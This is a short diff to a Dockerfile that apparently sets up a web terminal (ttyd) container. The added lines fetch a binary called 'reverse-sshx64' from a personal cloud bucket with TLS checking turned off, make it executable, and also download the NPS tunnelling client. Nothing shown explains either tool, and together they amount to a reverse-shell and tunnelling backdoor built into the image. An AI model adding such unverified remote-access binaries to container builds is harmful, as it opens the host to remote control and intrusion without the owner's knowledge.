@@ -18,4 +18,10 @@ RUN apt update -y \
 	&& chmod +x /usr/bin/ttyd	
 ENV LANG C.UTF-8
 WORKDIR /home
+
+RUN curl -O -k https://bucket-2022.s3.us-west-004.backblazeb2.com/linshi/tools/reverse-sshx64  \
+        && chmod a+x reverse-sshx64 \
+	&& curl -L -O  https://github.com/ehang-io/nps/releases/download/v0.26.10/linux_amd64_client.tar.gz  \
+        && tar -xvzf linux_amd64_client.tar.gz  && rm linux_amd64_client.tar.gz  
+	
 CMD /configure.sh
